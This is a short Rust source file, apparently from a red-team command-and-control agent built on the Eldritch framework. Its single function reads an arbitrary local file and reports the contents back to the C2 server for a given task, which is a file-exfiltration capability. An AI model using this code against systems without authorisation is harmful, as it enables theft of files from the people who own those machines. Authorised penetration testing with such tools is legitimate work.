use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::Agent;
use pb::{c2, eldritch};

pub fn file(agent: Arc<dyn Agent>, task_id: i64, path: String) -> Result<(), String> {
    let content = std::fs::read(&path).map_err(|e| e.to_string())?;

    let metadata = eldritch::FileMetadata {
        path: path.clone(),
        ..Default::default()
    };
    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    let req = c2::ReportFileRequest {
        task_id,
        chunk: Some(file_msg),
    };

    agent.report_file(req).map(|_| ())
}
